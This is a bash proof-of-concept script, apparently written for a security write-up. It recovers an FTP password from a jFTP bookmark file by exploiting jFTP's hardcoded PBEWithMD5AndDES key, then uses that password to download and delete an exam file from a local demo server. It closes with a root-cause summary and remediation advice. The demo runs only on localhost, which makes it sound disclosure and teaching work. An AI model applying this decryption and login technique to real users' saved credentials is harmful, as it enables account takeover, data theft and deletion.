#!/usr/bin/env bash
#
# Simulated attack: recover an FTP password from a jFTP bookmark file by
# exploiting jFTP's hardcoded PBEWithMD5AndDES key/salt in Crypto.java,
# then use the recovered credentials to download and delete a "sensitive"
# exam file from a pyftpdlib FTP server that otherwise requires auth.
#
# This only ever talks to the local demo server started by this script
# (127.0.0.1:2121) and only ever decrypts a ciphertext this script itself
# produced moments earlier with jFTP's own (unmodified) Crypto class.
#
set -euo pipefail

DEMO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# jftp/ and pyftpdlib/ are found automatically as siblings of this attack/
# folder (i.e. directly under the repo root -- this repo's actual layout).
# Override with the JFTP_SRC / PYFTPDLIB_SRC env vars if you've moved things.
REPO_ROOT="$(cd "${DEMO_DIR}/.." && pwd)"
JFTP_SRC="${JFTP_SRC:-${REPO_ROOT}/jftp}"
PYFTPDLIB_SRC="${PYFTPDLIB_SRC:-${REPO_ROOT}/pyftpdlib}"
export PYFTPDLIB_SRC

if [[ ! -f "${JFTP_SRC}/src/java/net/sf/jftp/config/Crypto.java" ]]; then
    echo "Could not find jftp/src/java/.../Crypto.java under ${JFTP_SRC}" >&2
    echo "Set JFTP_SRC to the path of your jftp/ checkout and re-run." >&2
    exit 1
fi
if [[ ! -f "${PYFTPDLIB_SRC}/pyftpdlib/__init__.py" ]]; then
    echo "Could not find pyftpdlib/pyftpdlib/__init__.py under ${PYFTPDLIB_SRC}" >&2
    echo "Set PYFTPDLIB_SRC to the path of your pyftpdlib/ checkout and re-run." >&2
    exit 1
fi

CRYPTO_CP="${DEMO_DIR}/crypto_helper/out:${JFTP_SRC}/lib"

SERVER_ROOT="${DEMO_DIR}/server_root"
BOOKMARK_FILE="${DEMO_DIR}/jftp_config/.login_default"
ATTACKER_DIR="${DEMO_DIR}/attacker_workspace"
LOG_FILE="${DEMO_DIR}/logs/server.log"

HOST="127.0.0.1"
PORT="2121"

# The real FTP account password, as chosen by the ("victim") exam
# administrator. The attacker does NOT know this value in advance -- it is
# only ever referenced here to (a) start the server and (b) let the victim
# side "save" it into a jFTP bookmark, exactly as jFTP's save-password
# feature would. From here on, the attacker path only ever uses the
# ENCRYPTED copy recovered from the bookmark file.
VICTIM_PASSWORD="Fa!!2026_ExamDrop9"
VICTIM_USER="ta_exams"

section() { printf '\n=== %s ===\n' "$1"; }

cleanup() {
    if [[ -n "${SERVER_PID:-}" ]] && kill -0 "$SERVER_PID" 2>/dev/null; then
        kill "$SERVER_PID" 2>/dev/null || true
        wait "$SERVER_PID" 2>/dev/null || true
    fi
}
trap cleanup EXIT

section "0. Reset demo state"
mkdir -p "${SERVER_ROOT}" "$(dirname "${BOOKMARK_FILE}")" "${ATTACKER_DIR}" "$(dirname "${LOG_FILE}")"
# restore exam.txt from the fixture if a previous run deleted it (the
# exploit step below deletes it from server_root by design)
if [[ ! -f "${SERVER_ROOT}/exam.txt" ]]; then
    cp "${DEMO_DIR}/fixtures/exam.txt" "${SERVER_ROOT}/exam.txt"
fi
rm -f "${ATTACKER_DIR}"/exam.txt
echo "server_root contents:"
ls -la "${SERVER_ROOT}"

section "1. Start the FTP server (one account, no anonymous access)"
python3 "${DEMO_DIR}/server.py" \
    --root "${SERVER_ROOT}" \
    --user "${VICTIM_USER}" \
    --password "${VICTIM_PASSWORD}" \
    --host "${HOST}" --port "${PORT}" \
    > "${LOG_FILE}" 2>&1 &
SERVER_PID=$!

for i in $(seq 1 20); do
    if python3 - "$HOST" "$PORT" <<'PY' 2>/dev/null
import socket, sys
s = socket.create_connection((sys.argv[1], int(sys.argv[2])), timeout=0.5)
s.close()
PY
    then
        break
    fi
    sleep 0.25
done
echo "server started, pid=${SERVER_PID}"

section "2. Baseline: confirm the exam is NOT reachable without credentials"
python3 "${DEMO_DIR}/ftp_probe.py" baseline --host "$HOST" --port "$PORT"

section "3. Victim side: TA saves the FTP login in jFTP (bookmark file written to disk)"
ENCRYPTED_PW=$(java -cp "${CRYPTO_CP}" CryptoCli encrypt "${VICTIM_PASSWORD}")
cat > "${BOOKMARK_FILE}" <<EOF
${HOST}
${VICTIM_USER}
${ENCRYPTED_PW}
${PORT}
/
/home/ta/exams
EOF
echo "wrote ${BOOKMARK_FILE}:"
cat "${BOOKMARK_FILE}"
echo "(this is the kind of file that ends up in backups, shared lab accounts,"
echo " synced dotfiles, etc. -- the attacker's starting point is just read"
echo " access to this file, NOT the real FTP password.)"

section "4. Attacker side: recover the password from the bookmark file"
echo "attacker reads the bookmark file off disk:"
BM_HOST=$(sed -n '1p' "${BOOKMARK_FILE}")
BM_USER=$(sed -n '2p' "${BOOKMARK_FILE}")
BM_ENC_PW=$(sed -n '3p' "${BOOKMARK_FILE}")
BM_PORT=$(sed -n '4p' "${BOOKMARK_FILE}")
echo "  host=${BM_HOST} user=${BM_USER} port=${BM_PORT}"
echo "  stored (encrypted) password field: ${BM_ENC_PW}"

echo
echo "jFTP 'encrypts' saved passwords with PBEWithMD5AndDES using a password"
echo "and salt that are hardcoded constants in Crypto.java -- identical on"
echo "every install, and visible to anyone with the jFTP source or jar."
echo "The attacker recompiles/reuses that exact class to decrypt:"

RECOVERED_PW=$(java -cp "${CRYPTO_CP}" CryptoCli decrypt "${BM_ENC_PW}")
echo "  recovered plaintext password: ${RECOVERED_PW}"

if [[ "${RECOVERED_PW}" != "${VICTIM_PASSWORD}" ]]; then
    echo "recovery FAILED (recovered value does not match victim password)" >&2
    exit 1
fi
echo "  -> matches the real FTP account password."

section "5. Exploit: log in with recovered credentials, download + delete exam.txt"
python3 "${DEMO_DIR}/ftp_probe.py" exploit \
    --host "$HOST" --port "$PORT" \
    --user "${BM_USER}" --password "${RECOVERED_PW}" \
    --remote-file "exam.txt" \
    --local-dir "${ATTACKER_DIR}"

section "6. Impact"
echo "server_root now contains:"
ls -la "${SERVER_ROOT}"
echo
echo "attacker_workspace now contains:"
ls -la "${ATTACKER_DIR}"
echo
if [[ -f "${ATTACKER_DIR}/exam.txt" ]]; then
    echo "attacker's local copy of the exfiltrated exam:"
    cat "${ATTACKER_DIR}/exam.txt"
fi

if [[ -f "${SERVER_ROOT}/exam.txt" ]]; then
    echo "FAILED: exam.txt still present on the server" >&2
    exit 1
fi

section "7. Server log (for reference)"
cat "${LOG_FILE}"

section "Summary"
cat <<'SUMMARY'
Root cause: net.sf.jftp.config.Crypto uses a hardcoded password and salt
(PBEWithMD5AndDES) to obscure saved FTP passwords. This is reversible
encryption with a key that is identical for every user and every install,
and is public (it ships in the open-source jar/class files). Anyone who can
read a user's saved-login file (bookmarks.txt / .login_default) can recover
the real FTP password without brute-forcing, sniffing traffic, or touching
the server at all -- "storing" the password this way is only cosmetically
different from storing it in plaintext.

This defeats the server-side control entirely: the FTP server itself was
configured correctly (no anonymous access, a single account scoped to its
own directory), but the secrecy of that account's password was the only
thing standing between "accessor" and the exam file, and that secrecy was
never real.

Remediations to point out in a writeup:
  - Never encrypt/obfuscate locally stored secrets with a key that is
    hardcoded in source/bytecode shipped to every user (CWE-321 / CWE-798).
  - Use OS-provided secret storage (keychain/credential manager/DPAPI) or a
    per-install, randomly generated key never written to disk in the clear.
  - Don't rely on a single long-lived shared credential for something as
    sensitive as exam distribution; use short-lived, per-user credentials
    or tokens and rotate/revoke them.
  - Treat "encrypted at rest with a static key" as equivalent to plaintext
    for threat-modeling purposes.
SUMMARY
